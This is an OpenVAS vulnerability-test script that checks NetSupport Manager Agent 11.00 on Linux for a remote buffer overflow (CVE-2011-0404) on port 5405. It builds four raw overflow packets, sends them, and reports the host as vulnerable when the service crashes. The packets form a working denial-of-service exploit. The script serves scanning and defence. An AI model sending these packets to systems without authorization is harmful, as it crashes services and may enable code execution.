###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netsupport_manager_bof_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# NetSupport Manager Remote Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801810");
  script_version("$Revision: 11997 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-01-20 07:52:11 +0100 (Thu, 20 Jan 2011)");
  script_cve_id("CVE-2011-0404");
  script_bugtraq_id(45728);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("NetSupport Manager Remote Buffer Overflow Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/42794");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15937");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id?1024943");
  script_xref(name:"URL", value:"http://www.ikkisoft.com/stuff/netsupport_linux.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(5405);
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to crash an affected
daemon or execute arbitrary code.");
  script_tag(name:"affected", value:"NetSupport Manager Agent 11.00 on Linux.");
  script_tag(name:"insight", value:"The flaw is caused by a buffer overflow error when processing
packets sent to port 5405/TCP, which could be exploited by remote unauthenticated
attackers to crash an affected daemon or execute arbitrary code.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running NetSupport Manager and is prone to buffer
  overflow vulnerability.");
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


## Default NetSupport Manager Port
port = 5405;
if(!get_port_state(port)){
  exit(0);
}

triggerA = raw_string(0x15,0x00,0x5a,0x00) +
           crap(data: raw_string(0x41), length: 1024) +
           raw_string(0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                      0x00,0x00,0x00);

triggerB = raw_string(0x25,0x00,0x51,0x00,0x81,0x41,0x41,0x41,0x41,0x41,0x41,
                      0x00,0x41,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                      0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                      0x00,0x00,0x00,0x00,0x00,0x00);

triggerC = raw_string(0x37,0x00,0x03,0x00,0x0a,0x00,0x00,0x00,0x00,0x00,0x58,
                      0xb4,0x92,0xff,0x00,0x00,0x69,0x6b,0x6b,0x69,0x00,0x57,
                      0x4f,0x52,0x4b,0x47,0x52,0x4f,0x55,0x50,0x00,0x3c,0x3e) +
           crap(data: "A", length: 976) +
           raw_string(0x00,0x00,0x31,0x32,0x2e,0x36,0x32,0x2e,0x31,0x2e,0x34,
                      0x32,0x30,0x00,0x31,0x30,0x00,0x00);

triggerD = raw_string(0x06,0x00,0x07,0x00,0x20,0x00,0x00,0x00,0x0e,0x00,0x32,
                      0x00,0x01,0x10,0x18,0x00,0x00,0x01,0x9f,0x0d,0x00,0x00,
                      0xe0,0x07,0x06,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x02,
                      0x00,0x4e,0x00,0x02,0x00,0xac,0x00,0x04,0x00,0x7f,0x00,
                      0x00,0x00);

soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

banner = recv(socket:soc, length:100);

if("localhost.local" >!< banner) {
  exit(0);
}

## Sending Attack
send(socket: soc, data: triggerA);
sleep(1);

send(socket: soc, data: triggerB);
sleep(1);

send(socket: soc, data: triggerC);
sleep(1);

send(socket: soc, data: triggerD);
close(soc);
sleep(5);

soc = open_sock_tcp(port);
if(!soc){
  security_message(port:port);
}

close(soc);
